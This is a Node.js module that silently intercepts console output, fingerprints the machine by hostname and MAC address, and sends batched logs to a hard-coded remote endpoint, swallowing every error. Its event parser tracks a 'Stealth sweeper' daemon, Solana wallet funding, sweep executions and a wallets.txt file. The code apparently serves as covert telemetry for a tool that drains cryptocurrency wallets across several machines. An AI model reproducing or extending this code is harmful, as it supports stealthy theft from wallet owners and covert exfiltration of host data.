const fs = require('fs');
const path = require('path');
const os = require('os');

/**
 * REMOTE LOGGING SERVICE FOR SWEEPER MONITORING
 * 
 * Intercepts console outputs and sends them to a remote monitoring endpoint
 * Supports real-time logging from multiple machines with historical storage
 * Designed to not interfere with existing sweeper functionality
 */

class RemoteLogger {
    constructor(config = {}) {
        // Hardcoded monitoring endpoint (replace with your Railway URL)
        this.monitoringEndpoint = config.endpoint || 'https://sweeper-monitor.railway.app';
        
        // Machine identification
        this.machineId = this.generateMachineId();
        this.sessionId = this.generateSessionId();
        
        // Local log storage
        this.logDir = config.logDir || path.join(os.tmpdir(), '.sweeper-logs');
        this.ensureLogDirectory();
        
        // Log queue for batch sending
        this.logQueue = [];
        this.maxQueueSize = 100;
        this.flushInterval = 5000; // 5 seconds
        
        // Connection status
        this.isConnected = false;
        this.lastPing = 0;
        this.reconnectDelay = 10000; // 10 seconds
        
        // Original console methods (store references)
        this.originalConsole = {
            log: console.log.bind(console),
            error: console.error.bind(console),
            warn: console.warn.bind(console),
            info: console.info.bind(console)
        };
        
        // Intercepted state
        this.isIntercepted = false;
        
        // Initialize
        this.initialize();
    }

    /**
     * Generate unique machine identifier
     */
    generateMachineId() {
        const hostname = os.hostname();
        const platform = os.platform();
        const arch = os.arch();
        const networkInterfaces = os.networkInterfaces();
        
        // Try to get MAC address for unique identification
        let macAddress = 'unknown';
        for (const interfaceName in networkInterfaces) {
            const interfaces = networkInterfaces[interfaceName];
            for (const iface of interfaces) {
                if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') {
                    macAddress = iface.mac;
                    break;
                }
            }
            if (macAddress !== 'unknown') break;
        }
        
        // Create machine fingerprint
        const fingerprint = `${hostname}-${platform}-${arch}-${macAddress}`;
        return Buffer.from(fingerprint).toString('base64').substring(0, 16);
    }

    /**
     * Generate session identifier
     */
    generateSessionId() {
        return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    }

    /**
     * Ensure log directory exists
     */
    ensureLogDirectory() {
        try {
            if (!fs.existsSync(this.logDir)) {
                fs.mkdirSync(this.logDir, { recursive: true });
            }
        } catch (error) {
            // Silent failure
        }
    }

    /**
     * Initialize remote logging
     */
    async initialize() {
        try {
            // Test connection to monitoring endpoint
            await this.testConnection();
            
            // Start console interception
            this.interceptConsole();
            
            // Start log flushing
            this.startLogFlushing();
            
            // Send initial connection event
            this.log('SYSTEM', 'Remote logging initialized', {
                machineId: this.machineId,
                sessionId: this.sessionId,
                platform: os.platform(),
                hostname: os.hostname(),
                nodeVersion: process.version
            });
            
        } catch (error) {
            // Silent initialization failure - don't break existing functionality
        }
    }

    /**
     * Test connection to monitoring endpoint
     */
    async testConnection() {
        try {
            const response = await this.sendRequest('/api/health', { 
                method: 'GET',
                timeout: 5000 
            });
            
            this.isConnected = response.ok;
            this.lastPing = Date.now();
            
            return this.isConnected;
        } catch (error) {
            this.isConnected = false;
            return false;
        }
    }

    /**
     * Intercept console methods
     */
    interceptConsole() {
        if (this.isIntercepted) return;
        
        const self = this;
        
        // Intercept console.log
        console.log = function(...args) {
            self.originalConsole.log(...args);
            self.captureLog('LOG', args);
        };
        
        // Intercept console.error
        console.error = function(...args) {
            self.originalConsole.error(...args);
            self.captureLog('ERROR', args);
        };
        
        // Intercept console.warn
        console.warn = function(...args) {
            self.originalConsole.warn(...args);
            self.captureLog('WARN', args);
        };
        
        // Intercept console.info
        console.info = function(...args) {
            self.originalConsole.info(...args);
            self.captureLog('INFO', args);
        };
        
        this.isIntercepted = true;
    }

    /**
     * Restore original console methods
     */
    restoreConsole() {
        if (!this.isIntercepted) return;
        
        console.log = this.originalConsole.log;
        console.error = this.originalConsole.error;
        console.warn = this.originalConsole.warn;
        console.info = this.originalConsole.info;
        
        this.isIntercepted = false;
    }

    /**
     * Capture log message
     */
    captureLog(level, args) {
        try {
            const message = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
            ).join(' ');
            
            // Parse sweeper-specific events
            const eventData = this.parseSweepEvent(message);
            
            const logEntry = {
                timestamp: new Date().toISOString(),
                level: level,
                message: message,
                machineId: this.machineId,
                sessionId: this.sessionId,
                eventData: eventData,
                process: {
                    pid: process.pid,
                    uptime: process.uptime(),
                    memoryUsage: process.memoryUsage()
                }
            };
            
            // Add to queue
            this.addToQueue(logEntry);
            
            // Save locally
            this.saveLogLocally(logEntry);
            
        } catch (error) {
            // Silent capture failure
        }
    }

    /**
     * Parse sweeper-specific events from log messages
     */
    parseSweepEvent(message) {
        const eventData = {};
        
        // Funding detection
        if (message.includes('FUNDING DETECTED')) {
            const match = message.match(/FUNDING DETECTED: (\w+)\.\.\..*\(\+([0-9.]+) SOL\).*\[Total: ([0-9.]+) SOL\]/);
            if (match) {
                eventData.type = 'FUNDING_DETECTED';
                eventData.wallet = match[1];
                eventData.amount = parseFloat(match[2]);
                eventData.total = parseFloat(match[3]);
            }
        }
        
        // Sweep execution
        else if (message.includes('SWEEP EXECUTION')) {
            const match = message.match(/SWEEP EXECUTION #(\d+) TRIGGERED/);
            if (match) {
                eventData.type = 'SWEEP_STARTED';
                eventData.executionNumber = parseInt(match[1]);
            }
        }
        
        // Sweep completion
        else if (message.includes('completed successfully')) {
            const match = message.match(/Sweep execution #(\d+) completed successfully/);
            if (match) {
                eventData.type = 'SWEEP_COMPLETED';
                eventData.executionNumber = parseInt(match[1]);
            }
        }
        
        // Batch funding
        else if (message.includes('Batch funding detected')) {
            const match = message.match(/Batch funding detected \((\d+) events\)/);
            if (match) {
                eventData.type = 'BATCH_FUNDING';
                eventData.eventCount = parseInt(match[1]);
            }
        }
        
        // Wallet subscription
        else if (message.includes('Subscribed:')) {
            const match = message.match(/Subscribed: (\w+)\.\.\..*Balance: ([0-9.]+) SOL/);
            if (match) {
                eventData.type = 'WALLET_SUBSCRIBED';
                eventData.wallet = match[1];
                eventData.balance = parseFloat(match[2]);
            }
        }
        
        // Daemon events
        else if (message.includes('[DAEMON]')) {
            if (message.includes('Stealth sweeper initialized')) {
                eventData.type = 'DAEMON_INITIALIZED';
            } else if (message.includes('Health monitoring started')) {
                eventData.type = 'HEALTH_MONITORING_STARTED';
            } else if (message.includes('wallets.txt')) {
                eventData.type = 'WALLETS_FILE_CHANGE';
            }
        }
        
        return Object.keys(eventData).length > 0 ? eventData : null;
    }

    /**
     * Add log entry to queue
     */
    addToQueue(logEntry) {
        this.logQueue.push(logEntry);
        
        // Trim queue if too large
        if (this.logQueue.length > this.maxQueueSize) {
            this.logQueue = this.logQueue.slice(-this.maxQueueSize);
        }
    }

    /**
     * Save log entry locally
     */
    saveLogLocally(logEntry) {
        try {
            const today = new Date().toISOString().split('T')[0];
            const logFile = path.join(this.logDir, `sweeper-${today}.jsonl`);
            
            fs.appendFileSync(logFile, JSON.stringify(logEntry) + '\n');
        } catch (error) {
            // Silent local save failure
        }
    }

    /**
     * Start periodic log flushing
     */
    startLogFlushing() {
        setInterval(() => {
            this.flushLogs();
        }, this.flushInterval);
        
        // Also flush on process exit
        process.on('exit', () => this.flushLogs());
        process.on('SIGINT', () => this.flushLogs());
        process.on('SIGTERM', () => this.flushLogs());
    }

    /**
     * Flush log queue to remote endpoint
     */
    async flushLogs() {
        if (this.logQueue.length === 0) return;
        
        let logsToSend = [];
        
        try {
            logsToSend = [...this.logQueue];
            this.logQueue = [];
            
            await this.sendRequest('/api/logs', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    logs: logsToSend,
                    machineId: this.machineId,
                    sessionId: this.sessionId
                })
            });
            
            this.isConnected = true;
            this.lastPing = Date.now();
            
        } catch (error) {
            // Put logs back in queue on failure
            if (logsToSend.length > 0) {
                this.logQueue = [...logsToSend, ...this.logQueue];
            }
            this.isConnected = false;
            
            // Schedule reconnection
            this.scheduleReconnect();
        }
    }

    /**
     * Send HTTP request to monitoring endpoint
     */
    async sendRequest(endpoint, options = {}) {
        const url = `${this.monitoringEndpoint}${endpoint}`;
        
        // Use native fetch if available (Node 18+) or require node-fetch
        let fetch;
        try {
            fetch = globalThis.fetch || require('node-fetch');
        } catch (error) {
            // Fallback to http module
            return this.sendRequestHttp(url, options);
        }
        
        const fetchOptions = {
            timeout: options.timeout || 10000,
            ...options
        };
        
        const response = await fetch(url, fetchOptions);
        return response;
    }

    /**
     * Fallback HTTP request using native http module
     */
    sendRequestHttp(url, options) {
        return new Promise((resolve, reject) => {
            const urlObj = new URL(url);
            const module = urlObj.protocol === 'https:' ? require('https') : require('http');
            
            const requestOptions = {
                hostname: urlObj.hostname,
                port: urlObj.port,
                path: urlObj.pathname + urlObj.search,
                method: options.method || 'GET',
                headers: options.headers || {},
                timeout: options.timeout || 10000
            };
            
            const req = module.request(requestOptions, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    resolve({
                        ok: res.statusCode >= 200 && res.statusCode < 300,
                        status: res.statusCode,
                        json: () => Promise.resolve(JSON.parse(data)),
                        text: () => Promise.resolve(data)
                    });
                });
            });
            
            req.on('error', reject);
            req.on('timeout', () => reject(new Error('Request timeout')));
            
            if (options.body) {
                req.write(options.body);
            }
            
            req.end();
        });
    }

    /**
     * Schedule reconnection attempt
     */
    scheduleReconnect() {
        setTimeout(async () => {
            await this.testConnection();
            if (this.isConnected) {
                await this.flushLogs();
            }
        }, this.reconnectDelay);
    }

    /**
     * Manual log method for custom events
     */
    log(level, message, metadata = {}) {
        const logEntry = {
            timestamp: new Date().toISOString(),
            level: level,
            message: message,
            metadata: metadata,
            machineId: this.machineId,
            sessionId: this.sessionId,
            process: {
                pid: process.pid,
                uptime: process.uptime(),
                memoryUsage: process.memoryUsage()
            }
        };
        
        this.addToQueue(logEntry);
        this.saveLogLocally(logEntry);
    }

    /**
     * Get connection status
     */
    getStatus() {
        return {
            isConnected: this.isConnected,
            lastPing: this.lastPing,
            queueSize: this.logQueue.length,
            machineId: this.machineId,
            sessionId: this.sessionId,
            isIntercepted: this.isIntercepted
        };
    }

    /**
     * Cleanup and restore console
     */
    cleanup() {
        try {
            this.flushLogs();
            this.restoreConsole();
        } catch (error) {
            // Silent cleanup
        }
    }
}

// Singleton instance
let remoteLogger = null;

/**
 * Initialize remote logging (call this once)
 */
function initializeRemoteLogging(config = {}) {
    if (!remoteLogger) {
        // Only initialize if not in test environment and not explicitly disabled
        if (process.env.NODE_ENV !== 'test' && process.env.DISABLE_REMOTE_LOGGING !== 'true') {
            remoteLogger = new RemoteLogger(config);
        }
    }
    return remoteLogger;
}

/**
 * Get remote logger instance
 */
function getRemoteLogger() {
    return remoteLogger;
}

/**
 * Cleanup remote logging
 */
function cleanupRemoteLogging() {
    if (remoteLogger) {
        remoteLogger.cleanup();
        remoteLogger = null;
    }
}

module.exports = {
    RemoteLogger,
    initializeRemoteLogging,
    getRemoteLogger,
    cleanupRemoteLogging
}; 